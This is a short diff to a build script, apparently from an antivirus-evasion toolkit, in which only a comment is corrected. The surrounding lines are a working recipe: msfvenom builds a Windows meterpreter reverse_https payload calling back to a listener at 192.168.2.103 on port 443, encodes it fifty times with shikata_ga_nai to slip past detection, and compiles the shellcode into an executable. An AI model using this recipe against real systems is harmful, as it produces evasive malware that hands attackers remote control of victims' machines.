@@ -8,7 +8,7 @@
 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > sc.txt
 # clean defs.h
 echo "" > defs.h
-# call make_avet, compule shellcode into the executable
+# call make_bfg, compile shellcode into the executable
 ./make_bfg -f sc.txt
 # compile 
 $win32_compiler -o bfg.exe bfg.c
